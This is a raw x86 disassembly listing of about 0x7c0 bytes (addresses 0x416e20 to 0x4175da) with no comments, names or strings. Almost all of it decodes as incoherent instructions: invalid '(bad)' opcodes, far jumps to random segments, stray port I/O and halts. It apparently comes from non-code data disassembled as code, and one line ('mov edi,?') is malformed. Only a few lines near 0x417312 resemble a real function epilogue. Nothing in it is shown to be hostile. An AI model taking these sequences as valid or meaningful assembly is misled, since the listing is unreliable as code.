  416e20:	adc    al,0xd9
  416e22:	jmp    0x416e20
  416e24:	xchg   ebp,esp
  416e26:	xchg   esp,eax
  416e27:	adc    dl,ah
  416e29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e2a:	or     bl,ch
  416e2c:	lahf   
  416e2d:	adc    eax,0x9d3f27a7
  416e32:	psubsb mm5,QWORD PTR [eax+0x64d7ec65]
  416e39:	dec    DWORD PTR [edi]
  416e3b:	clc    
  416e3c:	test   dh,cl
  416e3e:	aas    
  416e3f:	push   cs
  416e40:	iret   
  416e41:	clc    
  416e42:	cs es jo 0x416e5b
  416e46:	(bad)  
  416e47:	push   ecx
  416e48:	mov    cs,WORD PTR [esi-0x2]
  416e4b:	jnp    0x416e18
  416e4d:	idiv   DWORD PTR fs:[edi]
  416e50:	enter  0xdb56,0xcf
  416e54:	push   ds
  416e55:	pop    esp
  416e56:	test   DWORD PTR [edi],ebp
  416e58:	leave  
  416e59:	xor    eax,0x379ba12e
  416e5e:	and    DWORD PTR [edi+0x1a],edx
  416e61:	retf   0xf70b
  416e64:	mov    edi,0x331e210
  416e69:	(bad)  [esi-0x6a]
  416e6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e6d:	jmp    0x416e36
  416e6f:	push   es
  416e70:	pop    DWORD PTR [ecx+eax*1-0x64]
  416e74:	nop
  416e75:	jmp    0xb6db:0xbf90f79b
  416e7c:	xchg   esi,eax
  416e7d:	(bad)  
  416e7e:	fimul  DWORD PTR [ebx+0x3d6c14a4]
  416e84:	mov    eax,0xeade7af9
  416e89:	adc    al,0x5e
  416e8b:	pop    ds
  416e8c:	adc    eax,0xf2b0a785
  416e91:	xchg   edx,eax
  416e92:	pop    esi
  416e93:	push   cs
  416e94:	hlt    
  416e95:	dec    BYTE PTR [ecx+0x38]
  416e98:	outs   dx,DWORD PTR ds:[esi]
  416e99:	jmp    0xb7c1:0x9dc7bbc8
  416ea0:	(bad)  
  416ea1:	call   0x3d2f:0x5a0fa1cb
  416ea8:	mov    eax,ds:0xc0737cb
  416ead:	xor    bl,bl
  416eaf:	or     DWORD PTR [ecx-0x4f060066],ebx
  416eb5:	cmp    BYTE PTR [edx-0xc],ch
  416eb8:	(bad)  
  416eb9:	cmc    
  416eba:	inc    esi
  416ebb:	iret   
  416ebc:	iret   
  416ebd:	aam    0x2f
  416ebf:	repnz mov eax,0xb6527b3c
  416ec5:	outs   dx,DWORD PTR ds:[esi]
  416ec6:	cmp    BYTE PTR [edx-0x37296099],bl
  416ecc:	test   BYTE PTR [esi],0xc
  416ecf:	cmp    DWORD PTR [eax+0x62],ecx
  416ed2:	sahf   
  416ed3:	adc    DWORD PTR [esp+ebp*1+0x20284138],ebp
  416eda:	into   
  416edb:	or     edi,DWORD PTR [edx-0x58]
  416ede:	xor    ebx,ebx
  416ee0:	cld    
  416ee1:	test   BYTE PTR [ebp+0x5c6b81c8],0xc3
  416ee8:	mov    BYTE PTR [edi+0x5c],ah
  416eeb:	pop    ecx
  416eec:	and    DWORD PTR [esi-0x24],ebx
  416eef:	fbld   TBYTE PTR [esi-0x10553c6a]
  416ef5:	add    BYTE PTR [edi],bh
  416ef7:	imul   BYTE PTR [edi+ebx*2-0x1bcc77b6]
  416efe:	imul   edi,DWORD PTR [ebp+ecx*1+0x13],0xffffffba
  416f03:	sar    esp,0x6f
  416f06:	leave  
  416f07:	lods   eax,DWORD PTR ds:[esi]
  416f08:	jae    0x416f60
  416f0a:	mov    ch,0x9f
  416f0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f0d:	xchg   edi,eax
  416f0e:	jecxz  0x416f72
  416f10:	dec    ebp
  416f11:	ror    BYTE PTR [ecx-0x5457a94f],1
  416f17:	inc    esp
  416f18:	cmc    
  416f19:	xchg   bh,ch
  416f1b:	out    dx,al
  416f1c:	dec    esi
  416f1d:	jne    0x416f56
  416f1f:	xchg   DWORD PTR [edi],esi
  416f21:	sbb    BYTE PTR [edi],cl
  416f23:	jo     0x416f72
  416f25:	dec    eax
  416f26:	scas   eax,DWORD PTR es:[edi]
  416f27:	or     DWORD PTR [edx+0x15],ebx
  416f2a:	cwde   
  416f2b:	fsubp  st(0),st
  416f2d:	es push eax
  416f2f:	push   eax
  416f30:	scas   al,BYTE PTR es:[edi]
  416f31:	mov    bl,0x17
  416f33:	shl    DWORD PTR [ebx-0x24],cl
  416f36:	and    BYTE PTR ss:[eax-0x34],al
  416f3a:	cmp    DWORD PTR [edi],edi
  416f3c:	bound  esp,QWORD PTR [esi-0x5a]
  416f3f:	pop    esp
  416f40:	jp     0x416f88
  416f42:	fwait
  416f43:	gs nop
  416f45:	and    cl,BYTE PTR [edx+0x3a213bf6]
  416f4b:	stc    
  416f4c:	xor    DWORD PTR [edx+0x3d],esp
  416f4f:	pop    edx
  416f50:	sub    ah,BYTE PTR [eax+ebp*4]
  416f53:	sbb    edx,DWORD PTR [eax+0x30b198d6]
  416f59:	test   al,0x93
  416f5b:	pop    ecx
  416f5c:	xchg   edi,eax
  416f5d:	les    ecx,FWORD PTR [edx+0x2355be26]
  416f63:	scas   eax,DWORD PTR es:[edi]
  416f64:	inc    cx
  416f66:	pop    ss
  416f67:	cli    
  416f68:	push   ebx
  416f69:	icebp  
  416f6a:	push   ebp
  416f6b:	xchg   ebp,eax
  416f6c:	jmp    DWORD PTR [eax+0x6e]
  416f6f:	fldenv [edx+0x40876404]
  416f75:	pop    es
  416f76:	int3   
  416f77:	push   ecx
  416f78:	sbb    eax,0xd4a472ee
  416f7d:	lods   al,BYTE PTR ds:[esi]
  416f7e:	adc    dl,BYTE PTR [esi-0x23093cc2]
  416f84:	cld    
  416f85:	retf   
  416f86:	mov    eax,0xc3aba74e
  416f8b:	xchg   esp,eax
  416f8c:	popf   
  416f8d:	xchg   cl,dl
  416f8f:	fimul  WORD PTR [ecx]
  416f91:	call   DWORD PTR [esi]
  416f93:	add    ah,BYTE PTR [ebx+edx*2+0x4564b5cd]
  416f9a:	mov    dh,ah
  416f9c:	inc    edi
  416f9d:	mov    ebp,0xe04199df
  416fa2:	(bad)  
  416fa4:	xor    eax,0x5d5694a3
  416fa9:	addr16 aas 
  416fab:	adc    eax,0x8f8dbeeb
  416fb0:	mov    ds:0xc6a69a07,ax
  416fb6:	dec    ecx
  416fb7:	xor    dl,dh
  416fb9:	leave  
  416fba:	aam    0xdb
  416fbc:	inc    edx
  416fbd:	arpl   WORD PTR [ebp+0x71],bx
  416fc0:	rcl    DWORD PTR [esp+ecx*2-0x41],1
  416fc4:	hlt    
  416fc5:	enter  0x746a,0xdc
  416fc9:	sbb    eax,0x4659be6
  416fce:	lods   eax,DWORD PTR ds:[esi]
  416fcf:	je     0x416f88
  416fd1:	xchg   edx,eax
  416fd2:	fmul   QWORD PTR [edx]
  416fd4:	adc    DWORD PTR [ebx],ebp
  416fd6:	adc    al,0x95
  416fd8:	jb     0x41700a
  416fda:	les    edi,FWORD PTR [eax]
  416fdc:	jb     0x416ff9
  416fde:	outs   dx,DWORD PTR ds:[esi]
  416fdf:	shr    ah,1
  416fe1:	pop    ebx
  416fe2:	popf   
  416fe3:	or     BYTE PTR [ebx+0xf2bd5d0],cl
  416fe9:	adc    al,BYTE PTR [eax-0x50f60e11]
  416fef:	retf   0xf7cd
  416ff2:	adc    ebp,esi
  416ff4:	retf   0xcd66
  416ff7:	leave  
  416ff8:	dec    edx
  416ff9:	add    eax,0x2352fdde
  416ffe:	pop    ebp
  416fff:	retf   
  417000:	mov    edx,0x2aa499a6
  417005:	mov    ecx,0x3cc7144d
  41700a:	mov    dh,0x14
  41700c:	scas   eax,DWORD PTR es:[edi]
  41700d:	pushf  
  41700e:	nop
  41700f:	mov    edi,ebx
  417011:	lods   al,BYTE PTR ds:[esi]
  417012:	ds pushf 
  417014:	out    dx,al
  417015:	aaa    
  417016:	mov    edi,0x4ed11d12
  41701b:	call   0x249c08d2
  417020:	in     al,0xe6
  417022:	mov    BYTE PTR ds:0x1a66623e,ah
  417028:	loopne 0x417011
  41702a:	and    eax,0xa4c093f2
  41702f:	cli    
  417030:	jmp    0xbc83:0x5168c46f
  417037:	xchg   esp,eax
  417038:	jo     0x417019
  41703a:	cmp    edx,DWORD PTR [eax]
  41703c:	cmp    BYTE PTR [ebx+0x59],0x83
  417040:	mov    bh,0x48
  417042:	jb     0x416fc9
  417044:	mov    bl,0x1d
  417046:	push   esi
  417047:	or     ah,BYTE PTR [ebp+0x2b9af6a9]
  41704d:	jge    0x4170cd
  41704f:	js     0x417080
  417051:	repz add eax,esi
  417054:	mov    ds:0x41eb62,eax
  417059:	jmp    0x417311
  41705e:	ret    
  41705f:	xlat   BYTE PTR ds:[ebx]
  417060:	leave  
  417061:	rcr    ecx,cl
  417063:	rcr    ecx,1
  417065:	xlat   BYTE PTR ds:[ebx]
  417066:	(bad)  
  417067:	cmp    DWORD PTR [edi+0x75ebcebb],edx
  41706d:	loop   0x4170b4
  41706f:	sub    edi,DWORD PTR [edi+0x78]
  417072:	xchg   ebp,eax
  417073:	jle    0x4170ed
  417075:	js     0x4170d5
  417077:	adc    al,0xc7
  417079:	mov    eax,ebx
  41707b:	xlat   BYTE PTR ds:[ebx]
  41707c:	fxch   st(3)
  41707e:	stos   BYTE PTR es:[edi],al
  41707f:	aam    0x24
  417081:	pop    edx
  417082:	in     eax,0xb3
  417084:	sub    eax,0xccb0175d
  417089:	dec    esi
  41708a:	xor    dh,0xf8
  41708d:	js     0x4170bc
  41708f:	hlt    
  417090:	stc    
  417091:	pop    ebx
  417092:	sbb    ecx,DWORD PTR [edx+eiz*4-0x17a498e1]
  417099:	fst    DWORD PTR [edi+ebp*8-0x68]
  41709d:	cmp    cl,BYTE PTR [ebp+0x5c71623a]
  4170a3:	fidiv  DWORD PTR [ebx-0x67bac566]
  4170a9:	pop    esi
  4170aa:	popf   
  4170ab:	mov    ds:0x1e926c34,eax
  4170b0:	adc    bh,BYTE PTR [edi+0x7b]
  4170b3:	pusha  
  4170b4:	push   eax
  4170b5:	lds    eax,FWORD PTR [ebx-0x24512c2c]
  4170bb:	push   edx
  4170bc:	mov    ds:0x5072ff7f,al
  4170c1:	lahf   
  4170c2:	xchg   ebx,eax
  4170c3:	push   0xea573935
  4170c8:	push   0x41
  4170ca:	adc    ah,dl
  4170cc:	scas   al,BYTE PTR es:[edi]
  4170cd:	cmp    dl,dh
  4170cf:	inc    ebx
  4170d0:	xor    al,0x3e
  4170d2:	or     eax,0xc73209ac
  4170d7:	pop    edi
  4170d8:	add    esp,DWORD PTR [esi-0x6e5310ab]
  4170de:	push   es
  4170df:	xor    ah,dl
  4170e1:	stos   BYTE PTR es:[edi],al
  4170e2:	test   edx,edi
  4170e4:	pop    esi
  4170e5:	clc    
  4170e6:	imul   ebp,DWORD PTR [ebx-0x55e4d163],0x6337c457
  4170f0:	and    dh,BYTE PTR [edi+eax*4]
  4170f3:	jmp    FWORD PTR [edx-0x74]
  4170f6:	jae    0x4170b0
  4170f8:	and    al,0x23
  4170fa:	ror    BYTE PTR [edx-0x521e572f],cl
  417100:	cmp    ebp,eax
  417102:	push   edx
  417103:	jns    0x4170c7
  417105:	dec    ebx
  417106:	fidiv  WORD PTR [edi+0x23b5236f]
  41710c:	mov    eax,DWORD PTR [ebx+0x1e6ee55f]
  417112:	sbb    DWORD PTR [edx],ebp
  417114:	int    0xa7
  417116:	int    0x74
  417118:	mov    dl,0xb4
  41711a:	xor    al,BYTE PTR [edi]
  41711c:	addr16 js 0x41712c
  41711f:	adc    cl,BYTE PTR [ecx+0x3f17597]
  417125:	add    DWORD PTR [edi-0x798e11cd],ebx
  41712b:	jg     0x4170e3
  41712d:	(bad)  
  41712e:	popf   
  41712f:	stc    
  417130:	aad    0x9d
  417132:	mov    bh,0x64
  417134:	imul   edi,DWORD PTR [ebx],0xbb4324ae
  41713a:	push   esp
  41713b:	mov    edx,edi
  41713d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41713e:	push   0xffffffa1
  417140:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417141:	rol    edx,1
  417143:	cs mov ah,0x2b
  417147:	in     al,0x70
  417149:	fwait
  41714a:	mov    al,ds:0xdf6f539c
  41714f:	cmp    eax,0x9fc9e8ba
  417154:	adc    BYTE PTR ds:0x9343d9ac,dl
  41715a:	clc    
  41715b:	mov    ds:0xfdf2b7da,al
  417160:	ds sbb bh,0x99
  417164:	scas   eax,DWORD PTR es:[edi]
  417165:	pop    es
  417166:	fldenv [ebx-0x5a]
  417169:	fidiv  WORD PTR [eax+0x7d]
  41716c:	sub    al,0x6d
  41716e:	mov    ah,0x0
  417170:	cdq    
  417171:	push   esp
  417172:	xlat   BYTE PTR ds:[ebx]
  417173:	mov    dh,0x4d
  417175:	inc    ecx
  417176:	mov    bh,0x64
  417178:	imul   esp,DWORD PTR [edi+0x4e],0xabf4de9b
  41717f:	mov    dh,0xe7
  417181:	test   eax,0x9ee3d046
  417186:	repz popf 
  417188:	mov    DWORD PTR [edi-0x1f],ebp
  41718b:	pop    ebx
  41718c:	sar    ebp,cl
  41718e:	mov    ecx,0x950fec63
  417193:	outs   dx,DWORD PTR ds:[esi]
  417194:	sbb    esi,ebx
  417196:	jnp    0x4171ac
  417198:	push   es
  417199:	stc    
  41719a:	aas    
  41719b:	mov    esp,0xc43d9471
  4171a0:	leave  
  4171a1:	cmp    DWORD PTR ds:0x6f2732f0,0xd190142
  4171ab:	mov    dh,BYTE PTR [ecx+0x9]
  4171ae:	fild   WORD PTR [eax+0x44e0b8a1]
  4171b4:	pop    ecx
  4171b5:	fadd   st,st(0)
  4171b7:	sbb    ch,BYTE PTR [eax]
  4171b9:	lds    esi,FWORD PTR ds:0x2865d723
  4171bf:	adc    esi,DWORD PTR [ecx-0x4b]
  4171c2:	repnz add al,0xf8
  4171c5:	pop    DWORD PTR [eax-0xc715b6b]
  4171cb:	shr    dh,0x79
  4171ce:	xor    esp,ecx
  4171d0:	inc    ecx
  4171d1:	imul   esi,DWORD PTR [eax],0xffffff88
  4171d4:	jne    0x4171a2
  4171d6:	mov    ecx,0x7a754177
  4171db:	and    eax,0x4b99429
  4171e0:	test   al,0xea
  4171e2:	int    0xc3
  4171e4:	mov    ebp,0x7b0c9a4f
  4171e9:	push   ds
  4171ea:	sub    al,0x17
  4171ec:	inc    esi
  4171ed:	cmp    eax,0x5e51b304
  4171f2:	ret    0x6284
  4171f5:	ret    0x6aa9
  4171f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171f9:	xor    cl,cl
  4171fb:	cmp    ah,BYTE PTR [esi]
  4171fd:	loopne 0x417205
  4171ff:	leave  
  417200:	or     DWORD PTR [ebx+0x36],0xdcc6ac38
  417207:	sub    ecx,DWORD PTR [ebp-0x49a28b7f]
  41720d:	push   cs
  41720e:	cmp    eax,0x73bd1682
  417213:	lds    ebp,FWORD PTR [ecx+0x76]
  417216:	mov    al,ds:0xc68aea2b
  41721b:	daa    
  41721c:	jnp    0x4171c3
  41721e:	jmp    0x8f8e:0x50ea5b18
  417225:	xor    DWORD PTR ss:[esi-0x4c],esi
  417229:	call   0xf625:0xe0f473df
  417230:	push   ebx
  417231:	lds    ebp,FWORD PTR [esi-0x79]
  417234:	ins    DWORD PTR es:[edi],dx
  417235:	bound  ecx,QWORD PTR [esi-0x48f72dbb]
  41723b:	ror    ebp,cl
  41723d:	ds jmp 0x17da:0x89a40df8
  417245:	aas    
  417246:	inc    eax
  417247:	mov    al,ds:0x8e084029
  41724c:	jae    0x4171cf
  41724e:	rcl    BYTE PTR [esi-0x61546f4],cl
  417254:	fadd   QWORD PTR [esi+0x46]
  417257:	add    ah,BYTE PTR [edx]
  417259:	sar    ebx,cl
  41725b:	call   0x288f:0x380a8c6
  417262:	cld    
  417263:	pop    esi
  417264:	dec    ebx
  417265:	fisubr WORD PTR [esi-0x2e0cbdb]
  41726b:	xchg   BYTE PTR [edx],ah
  41726d:	ror    DWORD PTR [eax],1
  41726f:	push   esi
  417270:	inc    ebx
  417271:	pop    edi
  417272:	pop    esp
  417273:	fidiv  WORD PTR [edi]
  417275:	test   BYTE PTR [esi],0xfa
  417278:	jecxz  0x4172ee
  41727a:	outs   dx,DWORD PTR ds:[esi]
  41727c:	loopne 0x417211
  41727e:	dec    esp
  41727f:	ret    0x3845
  417282:	loopne 0x4172ba
  417284:	push   0x2b29f394
  417289:	lods   al,BYTE PTR ds:[esi]
  41728a:	(bad)  
  41728b:	cli    
  41728c:	mov    ds:0x8d99bd86,al
  417291:	pop    edi
  417292:	sbb    eax,DWORD PTR [ebp-0x76cfaa19]
  417298:	or     dl,dl
  41729a:	jecxz  0x4172d9
  41729c:	lea    ebp,[ebx+0x6b]
  41729f:	cmp    eax,DWORD PTR [edi+0x5d82ba3b]
  4172a5:	mov    ds:0x3152d73f,al
  4172aa:	pop    edx
  4172ab:	and    ebx,esi
  4172ad:	jg     0x417270
  4172af:	add    al,0xe2
  4172b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172b3:	lea    ecx,[esi-0x3e10f65]
  4172b9:	inc    esp
  4172ba:	pop    esi
  4172bb:	outs   dx,DWORD PTR ds:[esi]
  4172bc:	es fwait
  4172be:	sbb    eax,esp
  4172c0:	pop    edi
  4172c1:	mov    ecx,DWORD PTR [ebp-0x18afb993]
  4172c7:	mov    al,0x38
  4172c9:	jecxz  0x4172b2
  4172cb:	push   eax
  4172cc:	mov    edx,0xc80d56da
  4172d1:	test   BYTE PTR [edx],bh
  4172d3:	outs   dx,BYTE PTR ds:[esi]
  4172d4:	in     eax,0x69
  4172d6:	mov    ds,ebx
  4172d8:	jmp    0xdb6f8796
  4172dd:	pop    es
  4172de:	js     0x4172a9
  4172e0:	pop    esp
  4172e1:	in     al,dx
  4172e2:	arpl   WORD PTR [edi+0x4d],bx
  4172e5:	pushf  
  4172e6:	push   ebp
  4172e7:	ror    DWORD PTR [esi],cl
  4172e9:	pop    DWORD PTR [esp+esi*1+0x25]
  4172ed:	mov    bh,0xcd
  4172ef:	es (bad) 
  4172f2:	fsub   st(2),st
  4172f4:	or     esi,DWORD PTR [eax+0x1d7dc2e3]
  4172fa:	outs   dx,BYTE PTR ds:[esi]
  4172fb:	adc    DWORD PTR [esi-0x2e],edx
  4172fe:	or     BYTE PTR [eax-0x18fb4305],0x67
  417305:	sub    dl,ah
  417307:	or     ebx,eax
  417309:	xchg   edx,eax
  41730a:	cmp    eax,0x835a64c1
  41730f:	(bad)  
  417310:	mov    edi,?
  417312:	jne    0x41730c
  417314:	push   DWORD PTR [ebp-0x4]
  417317:	call   0x40cf9c
  41731c:	mov    eax,DWORD PTR [ebp-0x4]
  41731f:	xor    eax,edi
  417321:	pop    edi
  417322:	jmp    0x4175da
  417327:	rcl    bl,cl
  417329:	rcl    esi,cl
  41732b:	rcl    esi,1
  41732d:	(bad)  
  41732f:	and    esi,DWORD PTR [ebp+0x49]
  417332:	shl    BYTE PTR [edi-0x1d680107],1
  417338:	sub    BYTE PTR [edi+0x78],bh
  41733b:	xchg   ebp,eax
  41733c:	jle    0x4173b6
  41733e:	js     0x41733a
  417340:	shl    DWORD PTR [eax],cl
  417342:	dec    esi
  417343:	fwait
  417344:	sub    eax,0x10c00fce
  417349:	jne    0x417344
  41734b:	add    eax,DWORD PTR [esi]
  41734d:	repz es dec edx
  417350:	adc    al,BYTE PTR [eax]
  417352:	mov    eax,DWORD PTR [edx]
  417354:	inc    edi
  417355:	sub    DWORD PTR [ecx-0x461383b0],edx
  41735b:	(bad)  
  41735c:	ret    
  41735d:	ss xchg edi,eax
  41735f:	dec    eax
  417360:	jb     0x417345
  417362:	iret   
  417363:	push   0x1084ba9
  417368:	ret    0x6b98
  41736b:	pop    edi
  41736c:	pop    ss
  41736d:	mov    ebx,edi
  41736f:	jge    0x4173a7
  417371:	pop    ds
  417372:	pop    ecx
  417373:	pop    eax
  417374:	cmp    DWORD PTR [ebx+ecx*2-0x60],edx
  417378:	or     bl,BYTE PTR [ecx-0x59]
  41737b:	js     0x4173d6
  41737d:	je     0x4173ec
  41737f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417380:	mov    dl,ch
  417382:	mov    ah,cl
  417384:	scas   al,BYTE PTR es:[edi]
  417385:	and    esp,ecx
  417387:	aas    
  417388:	les    ebx,FWORD PTR [ecx+eiz*4]
  41738b:	std    
  41738c:	xor    al,0x6f
  41738e:	imul   esp,esp,0x6d
  417391:	das    
  417392:	inc    ecx
  417393:	dec    ecx
  417394:	daa    
  417395:	or     eax,0xb81a1830
  41739a:	(bad)  
  41739b:	jl     0x4173e0
  41739d:	ficom  WORD PTR [edx]
  41739f:	leave  
  4173a0:	sub    edi,DWORD PTR [edi-0x43]
  4173a3:	add    al,0xaf
  4173a5:	das    
  4173a6:	dec    edx
  4173a7:	xor    esi,DWORD PTR [esi-0x7d]
  4173aa:	mov    ds:0xadeca409,eax
  4173af:	push   esp
  4173b0:	cmp    BYTE PTR [edi],0xe3
  4173b3:	add    dh,BYTE PTR [edi+edi*1-0x75b9c2e4]
  4173ba:	inc    ebx
  4173bb:	popa   
  4173bc:	fistp  WORD PTR [esp+eiz*4-0x50d5c804]
  4173c3:	out    dx,eax
  4173c4:	adc    BYTE PTR [edx+0x2e1ce886],ah
  4173ca:	retf   0x5e8c
  4173cd:	cld    
  4173ce:	pop    ds
  4173cf:	clc    
  4173d0:	inc    edx
  4173d1:	dec    edi
  4173d2:	(bad)  
  4173d3:	sub    al,0x2a
  4173d5:	ss cld 
  4173d7:	sar    DWORD PTR [edx-0xa74c209],cl
  4173dd:	js     0x417367
  4173df:	jp     0x4173be
  4173e1:	mov    al,BYTE PTR [esp+esi*2+0x7d3c16a0]
  4173e8:	push   0x3d
  4173ea:	out    0x35,eax
  4173ec:	inc    ebx
  4173ed:	stos   BYTE PTR es:[edi],al
  4173ee:	aaa    
  4173ef:	popf   
  4173f0:	hlt    
  4173f1:	inc    ebx
  4173f2:	cdq    
  4173f3:	(bad)  
  4173f4:	mov    al,BYTE PTR [ebp-0x60]
  4173f7:	in     eax,dx
  4173f8:	sub    eax,0x641c5cde
  4173fe:	mov    ss,WORD PTR [edi+0x5a]
  417401:	fcomi  st,st(0)
  417403:	xor    DWORD PTR [ebp-0x2c],edx
  417406:	clc    
  417407:	in     al,dx
  417408:	in     eax,dx
  417409:	mov    DWORD PTR [edx],eax
  41740b:	cmp    al,0x66
  41740d:	sbb    eax,0x4e00867e
  417412:	retf   0xcf7c
  417415:	fdivr  QWORD PTR [esi-0x600abf3c]
  41741b:	xor    eax,0xdd4c0447
  417420:	jo     0x417475
  417422:	adc    esi,eax
  417424:	or     BYTE PTR [edx],ch
  417426:	jbe    0x4173f6
  417428:	out    0xa2,al
  41742a:	aaa    
  41742b:	mov    al,0x75
  41742d:	loop   0x4173f3
  41742f:	sub    dl,bl
  417431:	cmp    dl,dh
  417433:	mov    ebx,0xddaa782b
  417438:	xchg   ecx,eax
  417439:	mov    ds,WORD PTR [ecx-0xe]
  41743c:	test   al,0xb7
  41743e:	sbb    DWORD PTR [ebx-0x69],edx
  417441:	sub    al,0x22
  417443:	jae    0x41748e
  417445:	xor    edx,ecx
  417447:	jb     0x41748b
  417449:	repnz xchg edx,eax
  41744b:	push   es
  41744c:	ret    0xafe9
  41744f:	add    BYTE PTR [ebp+0x530df056],ch
  417455:	enter  0x921a,0xdf
  417459:	jne    0x4174d0
  41745b:	push   edi
  41745c:	les    esi,FWORD PTR ds:0x98665e6b
  417462:	pop    ecx
  417463:	add    bl,BYTE PTR [ebx+0x20]
  417466:	out    dx,al
  417467:	sbb    BYTE PTR [edx+0x64],ch
  41746a:	ja     0x4174eb
  41746c:	dec    ecx
  41746d:	jg     0x417449
  41746f:	cld    
  417470:	xor    edi,DWORD PTR [eax+0x71]
  417473:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417475:	fwait
  417476:	cwde   
  417477:	jae    0x4173fc
  417479:	test   DWORD PTR es:[edi+0x26],esi
  41747d:	fisttp WORD PTR [ecx-0x35]
  417480:	out    dx,eax
  417481:	or     al,0x79
  417483:	mov    ebx,0xabb24fc9
  417488:	leave  
  417489:	pop    edx
  41748a:	mov    dl,0xda
  41748c:	jbe    0x417498
  41748e:	sub    eax,0x69654250
  417493:	mov    edi,0x772088c3
  417498:	dec    eax
  417499:	popa   
  41749a:	test   ebx,0xd08c3dc6
  4174a0:	neg    DWORD PTR [edx]
  4174a2:	test   ah,bh
  4174a4:	stos   BYTE PTR es:[edi],al
  4174a5:	adc    ebx,DWORD PTR [edx+0x72ca52df]
  4174ab:	jae    0x417473
  4174ad:	xor    esp,0x8b737e90
  4174b3:	mov    ds:0x7b5fe0a5,eax
  4174b8:	outs   dx,DWORD PTR ds:[esi]
  4174b9:	mov    WORD PTR [ecx+0x663a073d],es
  4174bf:	scas   al,BYTE PTR es:[edi]
  4174c0:	ins    BYTE PTR es:[edi],dx
  4174c1:	sti    
  4174c2:	jmp    0xb701:0x182b9d73
  4174c9:	inc    esi
  4174ca:	pop    edi
  4174cb:	js     0x4174fc
  4174cd:	pop    ss
  4174ce:	xor    edx,DWORD PTR [ecx-0x68]
  4174d1:	stc    
  4174d2:	push   edi
  4174d3:	mov    dl,0xc
  4174d5:	pop    esi
  4174d7:	dec    eax
  4174d8:	and    bl,BYTE PTR [esi+ebx*8]
  4174db:	mov    eax,0xce1c67dc
  4174e0:	xor    al,0x8e
  4174e2:	dec    ebp
  4174e3:	aaa    
  4174e4:	sbb    al,BYTE PTR [esi]
  4174e6:	mov    BYTE PTR [edi],bh
  4174e8:	cmp    eax,0xf4efbe08
  4174ed:	clc    
  4174ee:	int    0x43
  4174f0:	push   esi
  4174f1:	loope  0x417517
  4174f3:	sub    al,0x81
  4174f5:	retf   0xc40c
  4174f8:	xor    al,0xe2
  4174fa:	mov    eax,ds:0x4384bbca
  4174ff:	xlat   BYTE PTR ds:[ebx]
  417500:	push   eax
  417501:	into   
  417502:	mov    bh,0x8b
  417504:	fcomp  QWORD PTR [esi-0x45adbc03]
  41750a:	push   edi
  41750b:	pop    ebp
  41750c:	xor    eax,0x19e72787
  417511:	jae    0x41755c
  417513:	outs   dx,BYTE PTR ds:[esi]
  417514:	mov    ecx,0xbc71cf2e
  417519:	into   
  41751a:	out    0x7f,eax
  41751c:	mov    edi,0xcbdc1df5
  417521:	mov    al,0xa8
  417523:	pop    edi
  417524:	mov    eax,ds:0xd0f7b78a
  417529:	mov    ds:0x52fe98cb,eax
  41752e:	mov    dh,0xba
  417530:	leave  
  417531:	sbb    ebx,DWORD PTR [esi+eax*1]
  417534:	push   esp
  417535:	fwait
  417536:	mov    ebx,0xdee2d3ed
  41753b:	pop    ss
  41753c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41753d:	or     al,BYTE PTR [ebp-0x3b5a6047]
  417543:	jns    0x417517
  417545:	jnp    0x417504
  417547:	outs   dx,DWORD PTR ds:[esi]
  417548:	jne    0x4175b2
  41754a:	je     0x417531
  41754c:	jno    0x4175ca
  41754e:	mov    edi,0x56b02aa4
  417553:	sub    ecx,0xa1f32eb2
  417559:	sub    ch,BYTE PTR [edx]
  41755b:	fdivr  QWORD PTR [edx+0xd5326d7]
  417561:	xor    eax,0xd0370cd6
  417566:	pop    ecx
  417567:	xchg   ebx,eax
  417568:	mov    ds:0x74908f50,al
  41756d:	test   DWORD PTR [ebp+0x188656c5],esi
  417573:	test   al,0x24
  417575:	outs   dx,BYTE PTR ds:[esi]
  417576:	rol    DWORD PTR [ebp+0x75e98937],1
  41757c:	scas   eax,DWORD PTR es:[edi]
  41757d:	adc    BYTE PTR [eax+0x50e87737],dh
  417583:	pop    esp
  417584:	mov    DWORD PTR [edx],ecx
  417586:	cli    
  417587:	mov    cl,0xc8
  417589:	(bad)  
  41758a:	mov    DWORD PTR [esi-0x14],edx
  41758d:	scas   al,BYTE PTR es:[edi]
  41758e:	cmp    ch,BYTE PTR [ebp-0x59a9f11c]
  417594:	lods   al,BYTE PTR ds:[esi]
  417595:	mov    ah,0x70
  417597:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417598:	shl    BYTE PTR [esi-0x1e],cl
  41759b:	iret   
  41759c:	and    DWORD PTR [edx-0x76980c24],ebx
  4175a2:	ins    DWORD PTR es:[edi],dx
  4175a3:	fidivr WORD PTR [edi]
  4175a5:	sbb    esp,0xc35ec629
  4175ab:	(bad)  
  4175ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175ad:	imul   BYTE PTR ds:0x9ad19705
  4175b3:	adc    edi,DWORD PTR [edx+edx*4]
  4175b6:	ins    DWORD PTR es:[edi],dx
  4175b7:	push   0x26
  4175b9:	fbstp  TBYTE PTR [edi]
  4175bb:	es xchg ebx,eax
  4175bd:	cmp    dh,dh
  4175bf:	push   0xc
  4175c1:	add    bl,BYTE PTR [ebx-0x34]
  4175c4:	outs   dx,BYTE PTR ds:[esi]
  4175c5:	jg     0x417592
  4175c7:	xlat   BYTE PTR ds:[ebx]
  4175c8:	clc    
  4175c9:	shl    DWORD PTR [ebx+ecx*4],cl
  4175cc:	scas   eax,DWORD PTR es:[edi]
  4175cd:	xchg   ecx,eax
  4175ce:	cwde   
  4175cf:	sub    al,0xc7
  4175d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175d2:	push   ss
  4175d3:	inc    ecx
  4175d4:	add    ebx,DWORD PTR [edx]
  4175d6:	(bad)  
  4175d7:	test   al,0x82
  4175d9:	inc    edi
  4175da:	add    eax,esi
